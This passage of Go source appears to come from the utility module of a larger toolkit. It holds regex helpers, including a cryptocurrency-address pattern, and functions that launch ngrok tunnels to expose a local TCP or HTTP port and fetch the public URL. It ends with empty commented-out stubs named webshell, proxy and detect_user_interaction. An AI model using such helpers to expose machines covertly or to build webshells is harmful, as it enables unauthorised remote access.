		"time":   `^([0-9]|0[0-9]|1[0-9]|2[0-3]):([0-9]|[0-5][0-9])$`,
		"crypto": `^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$`,
	}
	r := regexp.MustCompile(regexes[regex_type])
	matches := r.FindAllString(str, -1)

	return len(matches) != 0
}

// ShuffleSlice randomly shuffles a list of strings.
func ShuffleSlice(s []string) []string {
	rand.Seed(time.Now().UnixNano())
	rand.Shuffle(len(s), func(i, j int) {
		s[i], s[j] = s[j], s[i]
	})

	return s
}

// StartNgrokTCP exposes a TCP server on a given port.
func StartNgrokTCP(port int) error {
	_, err := CmdOut(F("ngrok tcp %d", port))

	return err
}

// StartNgrokHTTP exposes a web server on a given port.
func StartNgrokHTTP(port int) error {
	_, err := CmdOut(F("ngrok http %d", port))

	return err
}

// GetNgrokURL returns the URL of the Ngrok tunnel exposing the machine.
func GetNgrokURL() (string, error) {
	local_url := "http://localhost:4040/api/tunnels"
	resp, err := http.Get(local_url)

	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	json, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	jq_op_1, _ := jq.Parse(".tunnels")
	json_1, _ := jq_op_1.Apply(json)
	jq_op_2, _ := jq.Parse(".[0]")
	json_2, _ := jq_op_2.Apply(json_1)
	jq_op_3, _ := jq.Parse(".public_url")
	json_3, _ := jq_op_3.Apply(json_2)
	json_sanitized := FullRemove(string(json_3), `"`)

	return json_sanitized, nil
}

// ExtractIntFromString extracts a list of possible integers from a given string.
func ExtractIntFromString(s string) []int {
	res := []int{}
	re := regexp.MustCompile(`[-]?\d[\d,]*[\.]?[\d{2}]*`)
	// fmt.Printf("String contains any match: %v\n", re.MatchString(str1)) // True
	submatchall := re.FindAllString(s, -1)

	for _, element := range submatchall {
		res = append(res, StrToInt(element))
	}

	return res
}

// Splitjoin splits a string then joins them using given delimiters.
func SplitJoin(s, splitter, joiner string) string {
	splitted := strings.Split(s, splitter)
	joined := strings.Join(splitted, joiner)

	return joined
}

// RevertSlice reverses a slice type agnostically.
func RevertSlice(s interface{}) {
	n := reflect.ValueOf(s).Len()
	swap := reflect.Swapper(s)

	for i, j := 0, n-1; i < j; i, j = i+1, j-1 {
		swap(i, j)
	}
}

// func dialog(message, title string) {
// 	zenity.Info(message, zenity.Title(title))
// }

// func SplitMultiSep(s string, seps []string) []string {
// 	f := func(c rune) bool {
// 		for _, sep := range seps {
// 			if c == sep { // what?
// 				return true
// 			}
// 		}
// 	}
// 	fields := strings.FieldsFunc(s, f)
// 	return fields
// }

/*

func keyboard_emul(keys string) error {

}

func proxy_tcp() error {

}

func proxy_udp() error {

}

func proxy_http() error {

}

func webshell(param, password string) error {

}

func stamp() {

}

func detect_user_interaction() (bool, error) {

}*/
